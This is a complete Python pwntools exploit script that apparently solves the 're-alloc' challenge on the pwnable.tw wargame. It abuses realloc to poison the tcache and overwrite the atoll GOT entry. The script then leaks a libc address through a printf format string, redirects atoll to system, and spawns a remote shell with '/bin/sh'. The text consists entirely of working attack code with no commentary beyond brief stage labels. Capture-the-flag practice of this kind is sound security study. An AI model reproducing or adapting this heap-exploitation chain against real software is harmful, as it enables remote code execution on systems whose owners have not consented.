from pwn import *
p = remote("chall.pwnable.tw", 10106)
elf = ELF("./re-alloc")
libc = ELF("./libc.so")
# p = elf.process()
# context.log_level = "debug"

def add(idx,size,data):
	p.sendlineafter(b"Your choice: ",str(1).encode())
	p.recvuntil(b"Index:")
	p.sendline(str(idx).encode())
	p.recvuntil(b"Size:")
	p.sendline(str(size).encode())
	p.recvuntil(b"Data:")
	p.send(data)

def edit(idx,size,data):
	p.sendlineafter(b"Your choice: ",str(2).encode())
	p.recvuntil(b"Index:")
	p.sendline(str(idx).encode())
	p.recvuntil(b"Size:")
	p.sendline(str(size).encode())
	if size!=0:
		p.recvuntil(b"Data:")
		p.send(data)

def delete(idx):
	p.sendlineafter(b"Your choice: ",str(3).encode())
	p.recvuntil(b"Index:")
	p.sendline(str(idx).encode())


with log.progress("Stage 1: Put at chunk0 atoll_got") as l:
    add(0,0x18,b'a'*8)
    edit(0,0,'') # free
    edit(0,0x18,p64(elf.got['atoll'])) # chunk0 -> atoll_got()  tcache[0x20]
    add(1,0x18,b'a'*8)
    l.success()

with log.progress("Stage 2: Clear heap[0] and heap[1]") as l:

# clear heap[0],heap[1]
    edit(0,0x38,b'a'*8) # chunk0 -> 0x38  tcache[0x40]
    delete(0)
    edit(1,0x38,b'b'*0x10) 
    delete(1)
    l.success()

with log.progress("Stage 3: Put at chunk0 atoll_got") as l:
#again
    add(0,0x48,b'a'*0x8)
    edit(0,0,b'')
    edit(0,0x48,p64(elf.got['atoll']))# chunk0 -> atoll_got()  tcache[0x50]
    add(1,0x48,b'a'*0x8)
    l.success()

with log.progress("Stage 4: Clear heap[0] and heap[1]") as l:

    edit(0,0x58,b'a'*8)# chunk0 -> 0x38  tcache[0x60]
    delete(0)
    edit(1,0x58,b'b'*0x10)
    delete(1)

with log.progress("Stage 5: Leak libc") as l:
    add(0,0x48,p64(elf.plt['printf']))# plt_printf
    p.sendlineafter(b"Your choice: ",str(1).encode())
    p.recvuntil(b"Index:")
    p.sendline(b'%paaa%pbbb%p')
    # p.recv()
    p.recvuntil(b'bbb')
    leak=int(p.recv(14),16)
    info(f"leak: {hex(leak)}")
    libc.address=leak-0x12e009
    l.success(hex(libc.address))

with log.progress("Stage 6: Overwriting memory") as l:
    p.sendlineafter(b"Your choice: ",str(1).encode())
    p.recvuntil(b":")
    p.sendline(b'a'+b'\x00')# idx = 1
    l.status("idx = 1")
    p.recvuntil(b":")
    p.send(b'%15c')# size = 15
    l.status("size = 15")
    p.recvuntil(b"Data:")
    p.send(p64(libc.sym['system']))
    p.sendlineafter(b"Your choice: ",str(3).encode())
    p.recvuntil(b"Index:")
    l.status("/bin/sh\\x00")
    p.sendline(b"/bin/sh\x00")
    l.success()
    
p.interactive()